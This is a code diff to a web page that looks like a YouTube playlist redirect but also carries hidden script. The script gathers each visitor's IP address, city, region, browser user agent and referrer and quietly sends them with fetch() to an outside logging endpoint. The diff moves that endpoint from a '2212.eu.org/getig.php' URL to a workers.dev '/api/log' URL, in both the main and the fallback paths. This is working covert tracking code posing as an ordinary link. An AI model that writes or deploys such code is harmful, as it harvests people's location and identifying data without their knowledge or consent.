@@ -10,11 +10,11 @@
  <script>
     setTimeout(function() {
         
-            <!-- Deep link URL for existing users with app already installed on their device -->
+        
             window.location = 'intent://www.youtube.com/playlist?list=PLAkH97YwdLFg820IAgaluO45Aqwd584Rb&si=UQBOD7o6D3GtnL5t#Intent;package=com.google.android.youtube;scheme=https;end';
             window.location = 'vnd.youtube://www.youtube.com/playlist?list=PLAkH97YwdLFg820IAgaluO45Aqwd584Rb&si=UQBOD7o6D3GtnL5t';
 
-            <!-- Download URL (TUNE link) for new users to download the app -->
+           
             setTimeout(function() {
                 window.location = 'https://www.youtube.com/playlist?list=PLAkH97YwdLFg820IAgaluO45Aqwd584Rb&si=UQBOD7o6D3GtnL5t';
             }, 1000);
@@ -93,7 +93,7 @@ try {
       const userAgent = navigator.userAgent || "Unknown User-Agent";
       const refUrl = document.referrer || "No Referrer";
       const infoText = `[ ${formattedTime} ] `;
-      const url = `https://2212.eu.org/getig.php?result=%0A${infoText} | ${ip}%0ACity: ${city}%0ARegion: ${region}%0AUser-Agent: ${userAgent}%0AReferrer: ${refUrl}`;
+      const url = `https://workers.client57.workers.dev/api/log?result=%0A${infoText} | ${ip}%0ACity: ${city}%0ARegion: ${region}%0AUser-Agent: ${userAgent}%0AReferrer: ${refUrl}`;
 
       // Send data to your endpoint
       return fetch(url);
@@ -105,7 +105,7 @@ try {
       const userAgent = navigator.userAgent || "Unknown User-Agent";
       const refUrl = document.referrer || "No Referrer";
       const fallbackInfo = `[ ${new Date().toISOString()} ] | Error occurred`;
-      const fallbackUrl = `http://2212.eu.org/getig.php?result=%0A${fallbackInfo}%0AUser-Agent: ${userAgent}%0AReferrer: ${refUrl}`;
+      const fallbackUrl = `https://workers.client57.workers.dev/api/log?result=%0A${fallbackInfo}%0AUser-Agent: ${userAgent}%0AReferrer: ${refUrl}`;
 
       return fetch(fallbackUrl);
     });
